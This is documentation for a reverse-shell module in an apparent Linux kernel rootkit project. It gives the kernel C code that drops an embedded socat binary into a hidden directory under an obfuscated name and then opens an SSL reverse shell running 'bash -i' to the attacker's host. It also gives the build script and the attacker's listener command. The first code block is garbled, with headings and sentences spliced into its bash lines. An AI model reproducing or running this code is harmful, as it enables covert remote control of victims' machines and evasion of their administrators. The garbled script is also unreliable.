\page reverse Reverse Shell

\tableofcontents

{#reverse-shell-doc}
As part of our project, we implemented a reverse shell using `socat` to establish an SSL-encrypted connection to the attack server. The choice of `socat` is motivated by its ability to provide a complete interactive shell, unlike simpler tools like `netcat` or even simply `bash`.
To ensure the presence of `socat` on the system, we integrated the binary directly into the rootkit, which allows dropping it dynamically when mounting the rootkit. This requires having a static version of `socat` that also embeds SSL, dumping this binary into the rootkit to finally be able to use it to establish the reverse shell.

### Loading socat into the module as payload

## Implementation

To load the `socat` binary into the rootkit, we use a script during module compilation. This script extracts the `socat` binary and converts it into a C character array, which is then integrated into the module's source code.

Uses the statically compiled `socat` binary embedded in the rootkit module.

```bash

generate_socat_h() {## SSL/TLS

  # if socat file does not exist, download it

  if [ ! -f socat ]; thenThe reverse shell connection is encrypted using SSL/TLS for secure communication.

    echo "socat binary not found."

    echo "Download static socat binary from github.com/ernw/static-toolbox"## Usage

    wget https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.4/socat-1.7.4.4-x86_64 -O socat

    if [ $? -ne 0 ]; thenLaunch with `getshell [port]` command (default port: 9001).

      echo "Failed to download socat binary."
      exit 1
    fi
    echo "Download complete."
  fi
  echo "Hexdumping socat to socat.h"
  xxd -i socat > include/socat.h
}

# Check if socat.h exists
if [ ! -f ./include/socat.h ]; then
  echo "socat.h not found, generating it..."
  generate_socat_h
else
  echo "socat.h already exists, skipping generation."
fi
```

Following this, we finally obtain a `socat.h` file containing the following code:

```c
unsigned char socat[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
  // ... (rest of socat binary)
};
unsigned long socat_len = 123456; // Length of socat binary
```

### Dropping the binary on target machine

The `socat` binary is dropped on the target machine thanks to the `drop_socat_binaire(void)` function:

```c
int drop_socat_binaire(void) {
    if (is_socat_binaire_dropped()) {
        DBG_MSG("drop_socat_binaire: socat binary already dropped\n");
        return SUCCESS;
    }

    struct file *f;
    loff_t pos = 0;

    f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (IS_ERR(f)) {
        ERR_MSG("drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
        return -FAILURE;
    }

    unsigned int written = kernel_write(f, socat, socat_len, &pos);
    if (written < 0) {
        ERR_MSG("drop_socat_binaire: kernel_write failed: %u\n", written);
        filp_close(f, NULL);
        return -FAILURE;
    }
    else if (written < socat_len) {
        ERR_MSG("drop_socat_binaire: only %u bytes written, expected %u\n", written, socat_len);
        filp_close(f, NULL);
        return -FAILURE;
    }
    else {
        DBG_MSG("socat written successfully (%u bytes)\n", written);
    }

    filp_close(f, NULL);

    return SUCCESS;
}
```

This function first checks if the binary has already been dropped, then creates and writes the content of the `socat` array (containing the binary) to the location defined by `SOCAT_BINARY_PATH`. It also handles potential errors during writing and ensures that the entire binary is properly written to disk.

> **Binary obfuscation and discretion**
> By default, the `socat` file dropped on the target machine is renamed with the `.sysd` extension to add a first layer of obfuscation. Moreover, it's placed in the rootkit's hidden directory, making it practically invisible to a regular user or system administrator. This choice aims to limit detection risks of the binary by analysis tools or during manual file system inspection.

### Reverse shell execution

To execute the reverse shell, we use the `launch_reverse_shell(char *args)` function:

```c
int launch_reverse_shell(char *args) {
  if (!is_socat_binaire_dropped()) {
    ERR_MSG("launch_reverse_shell: socat binary not dropped\n");
    return -FAILURE;
  }

  int port = REVERSE_SHELL_PORT; // Default port

  // Get port
  if (args && strlen(args) > 0)
    port = simple_strtol(args, NULL, 10);

  // Build socat command with specified port
  char cmd[256];
  snprintf(cmd, sizeof(cmd), "%s exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &",
          SOCAT_BINARY_PATH, ip, port);

  // Launch command
  int ret_code = exec_str_as_command(cmd, false);

  if (ret_code < 0) {
    ERR_MSG("launch_reverse_shell: failed to start reverse shell on port %d\n", port);
    return ret_code;
  }

  DBG_MSG("launch_reverse_shell: reverse shell started on port %d\n", port);
  return SUCCESS;
}
```

This function first checks that the `socat` binary has been properly dropped. It then retrieves the port to use (default or passed as argument), builds the reverse shell execution command with `socat`, then executes it via `exec_str_as_command`. Errors are handled and a success message is displayed if the shell is launched correctly.

**Explanation of the `socat` command used:**
```bash
socat exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:IP:PORT,verify=0 &
```
This `socat` command establishes an SSL connection to the specified IP and port, while redirecting standard input and output to an interactive `bash` shell. The options used are:
| Option                        | Description                                                                                      |
|-------------------------------|--------------------------------------------------------------------------------------------------|
| `exec:bash -i`                | Executes an interactive shell.                                                                   |
| `pty`                         | Allocates a pseudo-terminal for the shell.                                                       |
| `stderr`                      | Redirects errors to standard output.                                                             |
| `setsid`                      | Detaches the process from the terminal.                                                          |
| `sigint`                      | Handles interrupt signals.                                                                       |
| `sane`                        | Resets terminal parameters for standard behavior.                                                |
| `openssl-connect:IP:PORT`     | Establishes SSL connection to specified IP and port.                                             |
| `verify=0`                    | Disables SSL certificate verification (useful for tests, but avoid in production).               |

In summary, this command generates a custom shell allowing maximum interactivity and functionality, while being secured by SSL.

### Connection reception by attacker {#reverse-shell-reception}

To receive the reverse shell connection, the attacker must execute the following command on their server:

```bash
socat openssl-listen:PORT,cert=server.pem,verify=0,fork -
```

Where `PORT` is the port specified when launching the reverse shell on the victim, and `server.pem` is the SSL certificate used for the encrypted connection.

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>
